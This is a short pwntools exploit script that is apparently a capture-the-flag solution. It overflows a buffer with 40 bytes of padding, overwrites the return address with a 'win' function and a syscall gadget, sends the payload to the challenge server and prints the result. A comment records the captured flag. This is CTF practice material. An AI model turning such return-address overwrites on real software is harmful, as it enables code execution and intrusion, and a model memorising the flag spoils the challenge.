from pwn import *

winAddr = 0x4011e0
raxSysCall = 0x401245

payload = b'A'*40 + p64(winAddr) + p64(raxSysCall)
r = remote('pwn.chall.pwnoh.io', 13379)

r.recvuntil('Please leave a message at the tone: **beep**\n')
r.sendline(payload)
print(r.recvall())
#buckeye{ret2win_t1m3s_tw0_1s_ret4win_1_guess}